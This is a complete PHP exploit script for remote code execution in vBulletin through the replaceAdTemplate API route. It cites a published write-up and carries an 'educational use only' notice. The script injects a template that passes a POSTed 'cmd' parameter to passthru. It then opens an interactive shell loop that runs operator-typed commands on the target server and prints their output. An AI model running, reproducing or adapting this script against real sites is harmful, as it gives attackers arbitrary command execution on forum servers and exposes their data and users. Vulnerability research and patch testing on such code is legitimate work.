<?php

/*
    ----------------------------------------------------------------------
    vBulletin RCE Exploit (replaceAdTemplate)
    ----------------------------------------------------------------------

    Author..............: 0xgh057r3c0n
    Description.........: Remote Code Execution exploit for vBulletin
                          via vulnerable template rendering API.
    Purpose.............: Educational use only. Do not misuse.

    Write-up Reference..:
    https://karmainsecurity.com/dont-call-that-protected-method-vbulletin-rce
*/

set_time_limit(0);
error_reporting(E_ERROR);

// ANSI Colors
define("RED",    "\033[31m");
define("GREEN",  "\033[32m");
define("YELLOW", "\033[33m");
define("BLUE",   "\033[34m");
define("CYAN",   "\033[36m");
define("BOLD",   "\033[1m");
define("RESET",  "\033[0m");

function banner() {
    echo CYAN . BOLD . <<<'EOL'
      __________      .__  .__          __  .__      ___________________ ___________
___  _\______   \__ __|  | |  |   _____/  |_|__| ____\______   \_   ___ \\_   _____/
\  \/ /|    |  _/  |  \  | |  | _/ __ \   __\  |/    \|       _/    \  \/ |    __)_ 
 \   / |    |   \  |  /  |_|  |_\  ___/|  | |  |   |  \    |   \     \____|        \
  \_/  |______  /____/|____/____/\___  >__| |__|___|  /____|_  /\______  /_______  /
              \/                     \/             \/       \/        \/        \/             
    vBulletin RCE (replaceAdTemplate) Exploit by 0xgh057r3c0n
EOL;
    echo "\n" . RESET;
}


function usage($scriptName) {
    echo YELLOW . "\nUsage:   php {$scriptName} <URL>\n";
    echo "Example: php {$scriptName} http://localhost/vb/\n";
    echo "Example: php {$scriptName} https://target.site/\n\n" . RESET;
    exit;
}

function error_exit($msg) {
    echo RED . "\n[-] Error: $msg\n\n" . RESET;
    exit;
}

// --------------------------- MAIN SCRIPT --------------------------- //

banner();

if (!extension_loaded('curl')) {
    error_exit("The cURL extension is required!");
}

if ($argc != 2) {
    usage($argv[0]);
}

$target = rtrim($argv[1], '/') . '/';

$payload = [
    "routestring" => "ajax/api/ad/replaceAdTemplate",
    "styleid"     => "1",
    "location"    => "rce",
    "template"    => "<vb:if condition='\"passthru\"(\$_POST[\"cmd\"])'></vb:if>"
];

$ch = curl_init();
curl_setopt_array($ch, [
    CURLOPT_URL            => $target,
    CURLOPT_SSL_VERIFYPEER => false,
    CURLOPT_SSL_VERIFYHOST => false,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_POST           => true,
    CURLOPT_POSTFIELDS     => http_build_query($payload),
]);

$response = curl_exec($ch);

if ($response !== "null") {
    error_exit("Exploit failed. Could not inject the template.");
}

echo GREEN . "[+] Payload delivered successfully.\n" . RESET;
echo YELLOW . "[!] Entering interactive shell. Type 'exit' to quit.\n" . RESET;

$interactive = [
    "routestring" => "ajax/render/ad_rce"
];

while (true) {
    echo BOLD . BLUE . "\nvBulletin-shell# " . RESET;
    $cmd = trim(fgets(STDIN));

    if ($cmd === "exit") break;

    $interactive["cmd"] = $cmd;
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($interactive));

    $output = curl_exec($ch);
    if (preg_match('/(.+)\{"template":/s', $output, $m)) {
        echo GREEN . $m[1] . RESET;
    } else {
        error_exit("Exploit failed or server sanitized the output.");
    }
}

curl_close($ch);
echo GREEN . "\n[+] Session closed. Goodbye!\n" . RESET;
